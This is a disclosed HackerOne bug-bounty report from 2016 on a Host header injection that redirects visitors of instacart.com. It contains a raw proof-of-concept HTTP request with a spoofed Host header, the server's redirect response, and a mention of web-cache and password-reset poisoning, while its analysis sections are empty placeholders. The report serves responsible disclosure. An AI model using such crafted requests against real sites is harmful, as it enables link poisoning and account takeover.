---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '158019'
original_report_id: '158019'
title: 'Host Header Injection/Redirection in: https://www.instacart.com/'
weakness: Open Redirect
team_handle: instacart
created_at: '2016-08-10T00:13:32.757Z'
disclosed_at: '2016-09-11T10:24:58.832Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- open-redirect
---

# Host Header Injection/Redirection in: https://www.instacart.com/

## Metadata

- HackerOne Report ID: 158019
- Weakness: Open Redirect
- Program: instacart
- Disclosed At: 2016-09-11T10:24:58.832Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

Your website is vulnerable to Host Header Injection because the host header can be changed to something outside the target domain

In many cases, developers are trusting the HTTP Host header value and using it to generate links, import scripts and even generate password resets links with its value. This is a very bad idea, because the HTTP Host header can be controlled by an attacker. This can be exploited using web-cache poisoning and by abusing alternative channels like password reset emails.

GET / HTTP/1.1
Host: google.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

HTTP/1.1 301 Moved Permanently
Date: Tue, 09 Aug 2016 23:55:09 GMT
Location: https://google.com/
Server: nginx
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Connection: Close
Content-Type: text/html
Content-Length: 178

Reference: https://www.acunetix.com/vulnerabilities/web/host-header-attack

Regards,
Clarck

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
